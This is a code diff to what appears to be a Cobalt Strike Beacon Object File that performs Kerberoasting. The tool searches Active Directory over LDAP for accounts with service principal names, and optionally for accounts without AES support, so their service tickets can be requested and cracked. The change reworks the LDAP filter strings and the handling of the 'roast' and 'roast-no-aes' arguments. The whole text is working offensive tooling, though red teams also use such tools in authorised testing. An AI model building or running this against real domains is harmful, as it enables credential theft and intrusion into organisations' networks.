@@ -208,6 +208,7 @@ HRESULT FindSPNs(_In_ IDirectorySearch *pContainerToSearch, _In_ BOOL bListSPNs,
 	BOOL bResult = FALSE, bRoast = FALSE;
 	WCHAR wcSearchFilter[BUF_SIZE] = { 0 };
 	LPCWSTR lpwFormat = L"(&(objectClass=user)(objectCategory=person)%ls(!(userAccountControl:1.2.840.113556.1.4.803:=2))(servicePrincipalName=*)(sAMAccountName=%ls))";
+	LPCWSTR lpwFormatNoListSpn = L"(&(objectClass=user)(objectCategory=person)%ls(sAMAccountName=%ls))";
 	PUSER_INFO pUserInfo = NULL;
 	INT iCount = 0;
 	DWORD x = 0L;
@@ -248,12 +249,21 @@ HRESULT FindSPNs(_In_ IDirectorySearch *pContainerToSearch, _In_ BOOL bListSPNs,
 
 	// Add the filter.
 	if (bExcludeAES) {
-		MSVCRT$swprintf_s(wcSearchFilter, BUF_SIZE, lpwFormat, L"(!(msDS-SupportedEncryptionTypes>=8))", lpwFilter);
-		BeaconPrintf(CALLBACK_OUTPUT, "[*] Using LDAP filter: %ls\n", wcSearchFilter);
-	}
-	else{
-		MSVCRT$swprintf_s(wcSearchFilter, BUF_SIZE, lpwFormat, L"", lpwFilter);
-		BeaconPrintf(CALLBACK_OUTPUT, "[*] Using LDAP filter: %ls\n", wcSearchFilter);
+		if (!bListSPNs) {
+			MSVCRT$swprintf_s(wcSearchFilter, BUF_SIZE, lpwFormatNoListSpn, L"(!(msDS-SupportedEncryptionTypes>=8))", lpwFilter);
+			BeaconPrintf(CALLBACK_OUTPUT, "[*] Using LDAP filter: %ls\n", wcSearchFilter);
+		} else {
+			MSVCRT$swprintf_s(wcSearchFilter, BUF_SIZE, lpwFormat, L"(!(msDS-SupportedEncryptionTypes>=8))", lpwFilter);
+			BeaconPrintf(CALLBACK_OUTPUT, "[*] Using LDAP filter: %ls\n", wcSearchFilter);
+		}
+	} else {
+		if (!bListSPNs) {
+			MSVCRT$swprintf_s(wcSearchFilter, BUF_SIZE, lpwFormatNoListSpn, L"", lpwFilter);
+			BeaconPrintf(CALLBACK_OUTPUT, "[*] Using LDAP filter: %ls\n", wcSearchFilter);
+		} else {
+			MSVCRT$swprintf_s(wcSearchFilter, BUF_SIZE, lpwFormat, L"", lpwFilter);
+			BeaconPrintf(CALLBACK_OUTPUT, "[*] Using LDAP filter: %ls\n", wcSearchFilter);
+		}
 	}
 
 	pUserInfo = (PUSER_INFO)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(USER_INFO));
@@ -605,9 +615,11 @@ VOID go(IN PCHAR Args, IN ULONG Length) {
 		bExcludeAES = TRUE;
 	}
 	else if (lpwArgs != NULL && MSVCRT$_wcsicmp(lpwArgs, L"roast-no-aes") == 0) {
+		bListSPNs = FALSE;
 		bExcludeAES = TRUE;
 	}
 	else if (lpwArgs != NULL && MSVCRT$_wcsicmp(lpwArgs, L"roast") != 0) {
+		bListSPNs = FALSE;
 		BeaconPrintf(CALLBACK_ERROR, "Invalid argument, use 'list', 'list-no-aes', 'roast' or 'roast-no-aes' with an optional account (sAMAccountName) filter.\n");
 		return;
 	}
@@ -623,3 +635,4 @@ VOID go(IN PCHAR Args, IN ULONG Length) {
 
 	return;
 }
+
